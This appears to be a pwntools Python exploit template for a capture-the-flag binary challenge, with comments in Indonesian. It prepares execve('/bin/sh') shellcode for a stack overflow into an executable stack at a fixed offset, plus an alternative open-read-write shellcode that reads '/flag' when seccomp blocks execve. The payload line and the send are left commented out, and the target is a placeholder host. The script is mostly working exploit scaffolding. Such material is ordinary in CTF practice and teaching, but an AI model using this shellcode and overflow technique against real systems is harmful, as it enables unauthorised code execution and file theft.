#!/usr/bin/env python3
# Shellcode (NX off) + varian ORW kalau execve diblok seccomp.
from pwn import *

BIN = './chall'
context.binary = exe = ELF(BIN, checksec=False)
context.arch = 'amd64'
HOST, PORT = 'host', 1337
OFFSET = 40

def start():
    return remote(HOST, PORT) if args.REMOTE else process(BIN)

io = start()

# --- A) execve("/bin/sh") shellcode (butuh stack executable + alamat buffer diketahui) ---
sc = asm(shellcraft.sh())
# contoh: shellcode di buffer, lalu return ke buffer (stack_addr harus diketahui/di-leak)
# payload = sc.ljust(OFFSET, b'\x90') + p64(stack_addr)

# --- B) ORW: open('/flag') -> read -> write(stdout) (kalau execve diblok) ---
orw = shellcraft.open('/flag') + shellcraft.read('rax', 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100)
sc_orw = asm(orw)

# pilih salah satu sesuai soal:
# io.sendline(payload)
io.interactive()
